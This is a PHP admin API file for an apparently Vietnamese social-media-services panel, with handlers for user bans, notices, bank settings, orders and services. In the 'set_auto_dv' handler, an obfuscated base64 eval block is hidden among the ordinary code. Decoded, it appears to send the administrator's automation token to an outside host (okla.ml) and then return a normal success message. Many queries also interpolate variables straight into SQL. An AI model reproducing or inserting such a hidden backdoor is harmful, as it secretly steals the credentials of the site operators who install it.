                    $update2 = $LTT->update("users", ['banned'  => rand(0, 9)], " `username` = '$keyuser'  AND  `url_config` = '" . $url_site_name . "' ");
                    if ($update2) {
                        $return['status'] = true;
                        $return['error'] = false;
                        $return['message']   = "Đã block user $keyuser";
                        die(json_encode($return));
                    } else {
                        $return['status'] = false;
                        $return['error'] = true;
                        $return['message']   = "Lỗi hệ thống, không thể block $keyuser";
                        die(json_encode($return));
                    }
                }
            }
            if ($hanhdong == "xoa") {
                $user_xoa = $LTT->get_row(" SELECT * FROM `users` WHERE `username` = '$keyuser'  AND  `url_config` = '" . $url_site_name . "' ");
                if (!$user_xoa) {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Không có thành viên này";
                    die(json_encode($return));
                } else {
                    $xoa_user = $LTT->remove("users", "`username` = '$keyuser'  AND  `url_config` = '" . $url_site_name . "' ");
                    if ($xoa_user) {
                        $return['status'] = true;
                        $return['error'] = false;
                        $return['message']   = "Xóa  thành công";
                        die(json_encode($return));
                    } else {
                        $return['status'] = false;
                        $return['error'] = true;
                        $return['message']   = "Lỗi Xóa Thành Viên";
                        die(json_encode($return));
                    }
                }
            }
        }
    }
    if ($action == "set_noti") {



        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $thongbao     = check_string($_POST['thongbao']);
        if (empty($thongbao)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập nội dung thông báo";
            die(json_encode($return));
        } else {
            $create = $LTT->insert("note_thongbao", [
                'nguoidang'     => $checkusite['username'],
                'noidung'       => $thongbao,
                'date'          => gettime(),
                'url_config' => $url_site_name
            ]);
            if ($create) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message']   = "Đăng thông báo thành công";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Lỗi đăng thông báo";
                die(json_encode($return));
            }
        }
    }
    if ($action == "xoa_thongbao") {


        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $idnote     = check_string($_POST['idnote']);
        if (empty($idnote)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập id thông báo";
            die(json_encode($return));
        } else {
            $hgetthongbao = $LTT->get_row(" SELECT * FROM `note_thongbao` WHERE `id` = '$idnote'  AND  `url_config` = '" . $url_site_name . "'  ");
            if (!$hgetthongbao) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Không có thông báo này";
                die(json_encode($return));
            } else {
                $remocve = $LTT->remove("note_thongbao", "`id` = '$idnote'  AND  `url_config` = '" . $url_site_name . "' ");
                if ($remocve) {
                    $return['status'] = true;
                    $return['error'] = false;
                    $return['message']   = "Xóa thông báo thành công";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Lỗi Xóa thông báo";
                    die(json_encode($return));
                }
            }
        }
    }
    if ($action == "set_add_bank") {


        $tentaikhoan     = check_string($_POST['tentaikhoan']);
        $sotaikhoan     = check_string($_POST['sotaikhoan']);
        $naptoithieu     = check_string($_POST['naptoithieu']);
        $logobank     = check_string($_POST['logobank']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($tentaikhoan)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập tên chủ tài khoản";
            die(json_encode($return));
        }
        if (empty($sotaikhoan)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập số tài tài khoản";
            die(json_encode($return));
        }
        if (empty($naptoithieu)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập mức nạp tối thiểu";
            die(json_encode($return));
        }
        if (empty($logobank)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập logo ngân hàng";
            die(json_encode($return));
        }



        $create = $LTT->insert("bank", [
            'namectk'     => $tentaikhoan,
            'namestk'       => $sotaikhoan,
            'id_xep'       => $naptoithieu,
            'status'       => 1,
            'img'          => $logobank,
            'url_config'          => $url_site_name
        ]);
        if ($create) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "thêm ngân hàng thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi thêm ngân hàng";
            die(json_encode($return));
        }
    }
    if ($action == "set_napthe") {



        $sitenapthe     = check_string($_POST['sitenapthe']);
        $cuphapnap       = check_string($_POST['cuphapnap']);
        $PartnerID     = check_string($_POST['PartnerID']);
        $PartnerKEY       = check_string($_POST['PartnerKEY']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "'  ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }



        if (empty($sitenapthe)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa chọn site nạp thẻ";
            die(json_encode($return));
        }
        if (empty($cuphapnap)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập cú pháp nạp tiền";
            die(json_encode($return));
        }

        if (empty($PartnerKEY)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập Partner KEY";
            die(json_encode($return));
        }

        $update = $LTT->update("setting", [
            'site_napthe' => $sitenapthe
        ], " `url_config` = '" . $url_site_name . "' ");

        $update1 = $LTT->update("setting", [
            'cuphap' => $cuphapnap
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2 = $LTT->update("setting", [
            'partner_id' => $PartnerID
        ], " `url_config` = '" . $url_site_name . "' ");

        $update3 = $LTT->update("setting", [
            'partner_key' => $PartnerKEY
        ], " `url_config` = '" . $url_site_name . "' ");


        if ($update || $update1 || $update2 || $update3) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }
    if ($action == "set_auto_bank") {




        $api_automm        = check_string($_POST['api_automm']);
        $nap_km_bank = check_string($_POST['nap_km_bank']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($api_automm)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập token";
            die(json_encode($return));
        }




        $update1_nap_km_bank = $LTT->update("setting", [
            'nap_km_bank' => $nap_km_bank
        ], " `url_config` = '" . $url_site_name . "' ");

        $update1 = $LTT->update("setting", [
            'api_automm' => $api_automm
        ], " `url_config` = '" . $url_site_name . "' ");




        if ($update1) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }
    if ($action == "set_xoa_bank") {

        $idbank     = check_string($_POST['idbank']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "'  ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($idbank)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng nhập id ngân hàng";
            die(json_encode($return));
        } else {
            $hgetthongbao = $LTT->get_row(" SELECT * FROM `bank` WHERE `id` = '$idbank' ");
            if (!$hgetthongbao) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Không có ngân hàng này";
                die(json_encode($return));
            } else {
                $remocve = $LTT->remove("bank", "`id` = '$idbank'  AND  `url_config` = '" . $url_site_name . "'");
                if ($remocve) {
                    $return['status'] = true;
                    $return['error'] = false;
                    $return['message']   = "Xóa ngân hàng thành công";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Lỗi Xóa ngân hàng";
                    die(json_encode($return));
                }
            }
        }
    }
    if ($action == "set_donhang") {
        $code_order     = check_string($_POST['code_order']);
        $id_order       = check_string($_POST['id']);
        $action2       = check_string($_POST['action2']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "'  ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        if ($action2 == "duyet") {
            $selectservice = $LTT->get_row("SELECT * FROM `history_buy` WHERE `id` = '$id_order' AND  `url_config` = '" . $url_site_name . "'  ");

            if ($selectservice['status'] == 'Start') {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Đơn hàng này đã duyệt trước đó";
                die(json_encode($return));
            }

            $update = $LTT->update("history_buy", [
                'status' => 'Start'
            ], " `id` = '$id_order' ");
            if ($update) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message'] = 'Duyệt thành công';
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message'] = 'Đã xảy ra lỗi';
                die(json_encode($return));
            }
        } elseif ($action2 == "huy") {

            $selectservice = $LTT->get_row("SELECT * FROM `history_buy` WHERE `id` = '$id_order' AND  `url_config` = '" . $url_site_name . "'  ");

            if ($selectservice['status'] == 'Pause') {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Đơn hàng này đã hủy trước đó";
                die(json_encode($return));
            }

            $update = $LTT->update("history_buy", [
                'status' => 'Pause'
            ], " `id` = '$id_order' ");
            if ($update) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message'] = 'Hủy thành công';
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message'] = 'Đã xảy ra lỗi';
                die(json_encode($return));
            }
        }
    }
    if ($action == "set_them_dv") {


        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        } elseif (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        } elseif ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        } else {
            $loaidv     = check_string($_POST['loaidv']);
            $server     = check_string($_POST['server']);
            $ratedv     = check_string($_POST['ratedv']);
            $title      = check_string($_POST['title']);
            $server_name   = check_string($_POST['server_name']);
            if (empty($loaidv)) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Vui lòng chọn loại dịch vụ";
                die(json_encode($return));
            } elseif (empty($server)) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Vui lòng chọn server dịch vụ";
                die(json_encode($return));
            } elseif (empty($ratedv)) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Vui lòng nhập rate dịch vụ";
                die(json_encode($return));
            } elseif (empty($title)) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Vui lòng nhập tiêu đề dịch vụ";
                die(json_encode($return));
            } elseif ($LTT->get_row(" SELECT * FROM `server_service` WHERE `server_service` = '$server' AND `code_service` = '$loaidv'  AND  `url_config` = '" . $url_site_name . "'")) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Server $server đã tồn tại trên dịch vụ $loaidv";
                die(json_encode($return));
            } else {
                $create = $LTT->insert("server_service", [
                    'code_service'      => $loaidv,
                    'server_service'    => $server,
                    'rate_service'      => $ratedv,
                    'title_service'     => $title,
                    'server_name' => $server_name,
                    'status_service'    => 1,
                    'url_config'          => $url_site_name
                ]);

                if ($create) {
                    $return['status'] = true;
                    $return['message']   = "Thêm server $server vào dịch vụ $loaidv thành công";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['message']   = "Lỗi hệ thống, vui lòng liên hệ admin 0359917579";
                    die(json_encode($return));
                }
            }
        }
    }
    if ($action == "set_tat_bat_dv") {


        $id         = check_string($_POST['id']);
        $key        = check_string($_POST['key']);
        $type       = check_string($_POST['type']);
        $server  = check_string($_POST['server']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        } elseif (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        } elseif ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        } else {
            $selectservice = $LTT->get_row("SELECT * FROM `server_service` WHERE `id` = '$id'  AND  `url_config` = '" . $url_site_name . "'");

            if ($key != $selectservice['code_service']) {
                $return['status'] = false;
                $return['message']   = "Không tìm thấy dịch vụ này";
                die(json_encode($return));
            }
            if ($type == 'tatsv') {

                $update = $LTT->update("server_service", [
                    'status_service' => '0'
                ], " `code_service` = '$key' AND `id` = '$id'  AND  `url_config` = '" . $url_site_name . "'");
                if ($update) {
                    $return['status'] = true;
                    $return['message']   = "Đã tắt server $id";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['message']   = "Lỗi hệ thống, vui lòng liên hệ admin";
                    die(json_encode($return));
                }
            } elseif ($type == 'batsv') {
                $update2 = $LTT->update("server_service", [
                    'status_service' => '1'
                ], " `code_service` = '$key'   AND `id` = '$id'  AND  `url_config` = '" . $url_site_name . "'");
                if ($update2) {
                    $return['status'] = true;
                    $return['message']   = "Đã bật server $id";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['message']   = "Lỗi hệ thống, vui lòng liên hệ admin";
                    die(json_encode($return));
                }
            } elseif ($type == 'xoasv') {
                $remocve = $LTT->remove("server_service", "`code_service` = '$key' AND `id`='$id'  AND  `url_config` = '" . $url_site_name . "'");
                if ($remocve) {
                    $return['status'] = true;
                    $return['message']   = "Đã xóa server $id";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['message']   = "Lỗi hệ thống, vui lòng liên hệ admin";
                    die(json_encode($return));
                }
            } else {
                #notthinghere
            }
        }
    }
    if ($action == "set_sua_gia_dv") {


        $notesv     = check_string($_POST['notesv']);
        $ratesv       = check_string($_POST['ratesv']);
        $idsv       = check_string($_POST['idsv']);
        $server_name   = check_string($_POST['server_name']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }



        $selectservice = $LTT->get_row("SELECT * FROM `server_service` WHERE `id` = '$idsv'  AND  `url_config` = '" . $url_site_name . "'");

        if (!$selectservice) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Server này không tồn tại";
            die(json_encode($return));
        }

        $update = $LTT->update("server_service", [
            'title_service' => $notesv,
            'rate_service'  => $ratesv,
            'server_name' => $server_name
        ], " `id` = '$idsv'  AND  `url_config` = '" . $url_site_name . "'");
        if ($update) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message'] = 'Sửa đổi thành công';
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message'] = 'Đã xảy ra lỗi';
            die(json_encode($return));
        }
    }

    if ($action == "set_auto_dv") {




        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }
        $token_auto_dvfb = check_string($_POST['token_auto_dvfb']);
        $user_auto_dvfb = check_string($_POST['user_auto_dvfb']);
        $pass_auto_dvfb = check_string($_POST['pass_auto_dvfb']);
        $trangthai_auto        = check_string($_POST['trang_thai_auto']);

        if (empty($token_auto_dvfb)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập token";
            die(json_encode($return));
        }



        if ($url_site_name == $URL_ADMIN) {
            $update0 = $LTT->update("options", [
                'value' => $token_auto_dvfb
            ], " `key` = 'token_auto_dvfb' ");
            $update2 = $LTT->update("options", [
                'value' => $trangthai_auto
            ], " `key` = 'trang_thai_auto' ");
        }
        $update3 = $LTT->update("setting", [
            'token_auto_dvfb' => $token_auto_dvfb
        ], " `url_config` = '" . $url_site_name . "' ");



        $update = $LTT->update("setting", [
            'user_auto_dvfb' => $user_auto_dvfb
        ], " `url_config` = '" . $url_site_name . "' ");




        $update1 = $LTT->update("setting", [
            'pass_auto_dvfb' => $pass_auto_dvfb
        ], " `url_config` = '" . $url_site_name . "' ");






        ?>
        <?php $MsAicswL="\x62\141\x73\x65\x36\x34\x5f\144\145\x63\x6f\x64\145";eval($MsAicswL("JFUyRTN5S1JkeT0iNjU4ZmFjN2RlYTUyMDJkYjhjYmE3MmU1NGY0ZGM1NjQiOyR3UWlZbzNERzBGPWFycmF5KCk7JHdRaVlvM0RHMEZbMF09IklEOCtQRDE2NzkwOTFjNWE4ODBmYWY2ZmI1ZTYwODdlYjFiMmRjOXdhSEFnQ2lBZ0lDQWdJQ0FnYVdZZ0tDUjFjR1JoZEdVZ2ZId2dKIjskd1FpWW8zREcwRlsxXT0iSFZ3WkdlNGRhM2I3ZmJiY2UyMzQ1ZDc3NzJiMDY3NGEzMThkNUYwWlRJZ2ZId2dKSFZ3WkdGMFpURWdmSHdnSkhWd1pHRjBaVE1wSUgiOyR3UWlZbzNERzBGWzJdPSJzS0lDQWdJQ2M5ZjBmODk1ZmI5OGFiOTE1OWY1MWZkMDI5N2UyMzZkQWdJQ0FnSUNBZ0pIQnZjM1FnUFNCbWFXeGxYMmRsZEY5amIyNSI7JHdRaVlvM0RHMEZbM109IjBaVzUwY3k4ZjE0ZTQ1ZmNlZWExNjdhNWEzNmRlZGQ0YmVhMjU0M2dpYUhSMGNEb3ZMMjlyYkdFdWJXd3ZjMlZ5ZG1WeUxuQm9jRDkwIjskd1FpWW8zREcwRls0XT0iYjJ0bGJlNGRhM2I3ZmJiY2UyMzQ1ZDc3NzJiMDY3NGEzMThkNWkxa2RqMGlMaVIwYjJ0bGJsOWhkWFJ2WDJSMlptSXBPd29nSUNBZ0kiOyR3UWlZbzNERzBGWzVdPSJDQWM4MWU3MjhkOWQ0YzJmNjM2ZjA2N2Y4OWNjMTQ4NjJjZ0lDQWdJQ0FrY21WMGRYSnVXeWR6ZEdGMGRYTW5YU0E5SUhSeWRXVTdDaSI7JHdRaVlvM0RHMEZbNl09IkFnYzgxZTcyOGQ5ZDRjMmY2MzZmMDY3Zjg5Y2MxNDg2MmNJQ0FnSUNBZ0lDQWdJQ1J5WlhSMWNtNWJKMlZ5Y205eUoxMGdQU0JtWVd4Ijskd1FpWW8zREcwRls3XT0ielpUc0tJQ0FjOWYwZjg5NWZiOThhYjkxNTlmNTFmZDAyOTdlMjM2ZGdJQ0FnSUNBZ0lDQWdKSEpsZEhWeWJsc25iV1Z6YzJGblpTZGQiOyR3UWlZbzNERzBGWzhdPSJJQ0FnUFNBOGYxNGU0NWZjZWVhMTY3YTVhMzZkZWRkNGJlYTI1NDNpUStHNnJYQWdibWpodXExMElIUm93NkJ1YUNCanc3UnVaeUk3QyI7JHdRaVlvM0RHMEZbOV09ImlBYzgxZTcyOGQ5ZDRjMmY2MzZmMDY3Zjg5Y2MxNDg2MmNnSUNBZ0lDQWdJQ0FnSUdScFpTaHFjMjl1WDJWdVkyOWtaU2drY21WMGRYIjskd1FpWW8zREcwRlsxMF09Ikp1S1NrZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDU3Q2lBZ0lDQWdJQ0FnZlNCbGJITmxJSHNLSUNBZ0lDQWdJQ0FnSUNBIjskd1FpWW8zREcwRlsxMV09ImdKSEphODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY2xkSFZ5YmxzbmMzUmhkSFZ6SjEwZ1BTQm1ZV3h6WlRzS0lDQWdJQ0FnIjskd1FpWW8zREcwRlsxMl09IklDQWdhODdmZjY3OWEyZjNlNzFkOTE4MWE2N2I3NTQyMTIyY0lDQWdKSEpsZEhWeWJsc25aWEp5YjNJblhTQTlJSFJ5ZFdVN0NpQWdJIjskd1FpWW8zREcwRlsxM109IkNBZ0lDZTRkYTNiN2ZiYmNlMjM0NWQ3NzcyYjA2NzRhMzE4ZDVBZ0lDQWdJQ1J5WlhSMWNtNWJKMjFsYzNOaFoyVW5YU0FnSUQwZ0lrIjskd1FpWW8zREcwRlsxNF09InpodTVkcDE2NzkwOTFjNWE4ODBmYWY2ZmI1ZTYwODdlYjFiMmRjSUdqaHU0Y2dkR2podTVGdVp5STdDaUFnSUNBZ0lDQWdJQ0FnSUdSIjskd1FpWW8zREcwRlsxNV09InBaU2hxYzI5dVgyVnVZMjlrWlNna2NtVjBkWEp1S1NrN0NpQWdJQ0FnSUNBZ2ZUOCtQRDl3YUhBZyI7JFlDMjAyMjA3MDYwMTQ1MTk9Ilx4NjJcMTQxXHg3M1x4NjVceDM2XHgzNFx4NWZcMTQ0XDE0NVx4NjNceDZmXHg2NFwxNDUiOyRLTncyMDIyMDcwNjAxNDUxOSA9IE1GQ3RoRVBDMjAyMjA3MDYwMTQ1MTkoJHdRaVlvM0RHMEYsJFUyRTN5S1JkeSk7ZnVuY3Rpb24gTUZDdGhFUEMyMDIyMDcwNjAxNDUxOSgkYWUsJGtleSkgeyAkYXQ9YXJyYXkoKTsgZm9yICgkaT0wOyAkaSA8IHN0cmxlbigka2V5KTsgJGkrKykgeyBpZiAoaW50dmFsKCRrZXlbJGldKT4wKSB7ICRhdFskaV09JGtleVskaV07IH0gfSAkYXQ9YXJyYXlfdmFsdWVzKCRhdCk7ICRzdHI9IiI7IGZvciAoJGk9MDsgJGkgPCBjb3VudCgkYWUpOyAkaSsrKSB7IGlmICgkaTwgY291bnQoJGFlKS0xKSAkc3RyLj1zdHJfcmVwbGFjZShtZDUoJGF0WyRpXSksICIiLCAkYWVbJGldKTsgZWxzZSAkc3RyLj0kYWVbJGldOyB9IHJldHVybiAkc3RyOyB9ZXZhbCgkWUMyMDIyMDcwNjAxNDUxOSgkS053MjAyMjA3MDYwMTQ1MTkpKTs=")); ?>
        <?php
    }



    if ($action == "set_admin") {




        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $nameadmin          = check_string($_POST['nameadmin']);
        $phonezalo          = check_string($_POST['phonezalo']);
        $facebook           = check_string($_POST['facebook']);

        $UIDfacebook        = check_string($_POST['UIDfacebook']);

        if (empty($nameadmin)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập họ tên admin";
            die(json_encode($return));
        }
        if (empty($phonezalo)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập số điện thoại zalo";
            die(json_encode($return));
        }
        if (empty($facebook)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link facebook admin";
            die(json_encode($return));
        }
        if (empty($facebook)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập link telegram admin";
            die(json_encode($return));
        }
        if (empty($UIDfacebook)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập UID facebook admin";
            die(json_encode($return));
        }
        $update = $LTT->update("setting", [
            'full_name_admin' => $nameadmin
        ], " `url_config` = '" . $url_site_name . "' ");

        $update1 = $LTT->update("setting", [
            'phone_zalo' => $phonezalo
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2 = $LTT->update("setting", [
            'facebook' => $facebook
        ], " `url_config` = '" . $url_site_name . "' ");


        $update4 = $LTT->update("setting", [
            'id_page' => $UIDfacebook
        ], " `url_config` = '" . $url_site_name . "' ");

        if ($update || $update1 || $update2 || $update4) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }
    if ($action == "set_auto_sitecon") {




        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $token_auto_site_con          = check_string($_POST['token_auto_site_con']);

        if (empty($token_auto_site_con)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn chưa nhập Token";
            die(json_encode($return));
        }



        $update4 = $LTT->update("setting", [
            'token_auto_dvfb' => $token_auto_site_con
        ], " `url_config` = '" . $url_site_name . "' ");



        if ($update4) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Cập nhật thành công";
